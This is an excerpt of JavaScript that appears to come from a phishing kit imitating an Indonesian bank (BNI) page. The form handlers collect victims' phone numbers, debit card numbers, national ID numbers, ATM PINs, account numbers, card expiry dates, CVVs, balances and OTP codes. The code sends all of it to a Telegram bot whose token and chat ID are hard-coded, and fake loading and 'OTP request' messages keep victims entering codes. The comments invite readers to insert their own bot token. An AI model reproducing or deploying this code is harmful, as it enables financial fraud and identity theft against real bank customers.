function sendNohp(event){
 ...
 var nope = document.getElementById('nope');
    ...
    var gabungan = '' + logo.value + '%0A✬ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nope.value;

    var token = '6663827241:AAE1oe22Lte4loV-jT12cMAaM48tKkkZRsY'; // Ganti dengan token bot yang kamu buat
    var grup = '7056005811'; // Ganti dengan chat id dari bot yang kamu buat
...
function sendData(event){
   ...
   var debit = document.getElementById('debit');
    ...
    var gabungan = '' + logo.value + '%0A✬ 𝗡𝗼 𝗞𝗮𝗿𝘁𝘂 : ' + debit.value + '%0A✬ 𝗡𝗜𝗞 𝗞𝗧𝗣 : ' + nikktp.value + '%0A✬ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nomorhandphone.value + '%0A✬ 𝗣𝗜𝗡 𝗔𝗧𝗠 : ' + pinatm.value + '%0A✬ 𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸 : ' + reke.value;
...
Bot.start()   
  ...
  const bot = new Bot("6663827241:AAE1oe22Lte4loV-jT12cMAaM48tKkkZRsY", "7056005811")
...
function kirimPesan(event) {
 event.preventDefault();
  $("#loadersaya1").show();
    ...
    var gabungan = '' + logo.value + '%0A✬ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nope.value +  '%0A✬ 𝗡𝗼 𝗞𝗮𝗿𝘁𝘂 : ' + nama.value + '%0A✬ 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ' + bulan.value + "/" + tahun.value + '%0A✬ 𝗖𝗩𝗩 : ' + pesan.value + '%0A✬ 𝗦𝗮𝗹𝗱𝗼 : ' + "Rp. " + saldo.value + '%0A%0A✬ 𝗢𝗧𝗣%20𝗕𝗡𝗜 : ' +   pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
...
$("#blink").css("color","red");
   ...
   setTimeout(function(){
       $("#loadersaya1").hide();
        $("#blink").text("• Permintaan Kode OTP •");
...
event.preventDefault();
  $("#loadersaya").show();
   ...
   var nope = document.getElementById('nope');
    ...
    var gabungan = '' + logo.value + '%0A✬ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nope.value +  '%0A✬ 𝗡𝗼 𝗞𝗮𝗿𝘁𝘂 : ' + nama.value + '%0A✬ 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ' + bulan.value + "/" + tahun.value + '%0A✬ 𝗖𝗩𝗩 : ' + pesan.value + '%0A✬ 𝗦𝗮𝗹𝗱𝗼 : ' + "Rp. " + saldo.value;
